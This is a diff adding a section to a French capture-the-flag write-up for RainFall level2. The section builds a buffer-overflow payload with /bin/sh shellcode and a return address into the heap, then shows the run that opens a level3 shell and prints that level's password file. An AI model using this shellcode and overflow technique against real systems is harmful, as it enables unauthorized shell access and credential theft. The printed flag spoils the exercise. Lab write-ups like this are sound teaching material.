@@ -54,3 +54,34 @@ jne    0x8048527             ; Si différent, continue normalement
 * Laisser strdup() le copier dans la heap
 * Faire pointer l'adresse de retour vers cette copie dans le heap
 
+
+#### Construction du payload:
+
+- 1: on place notre shellcode au debut du buffer
+- 2: on rempli le reste du buffer
+- 3: on depasse le buffer pour reecrire l'addresse de retour en mettant l'addresse de notre shellcode:
+
+il faut arriver a l'addresse de retour de la fonction pour ce faire oil faut depasser buffer[76] et int memory qui fait 4 octet
+donc 80 octet
+
+Taille du shelllcode = 21 octet
+`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
+
++
+59 a + 21(shellcode) = 80
+`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
+
++ 
+l'addresse du debut du buffer
+`x08\xa0\x04\x08`
+
+```bash
+level2@RainFall:~$ (echo -e "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\xa0\x04\x08" ; cat -) | ./level2
+j
+ X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
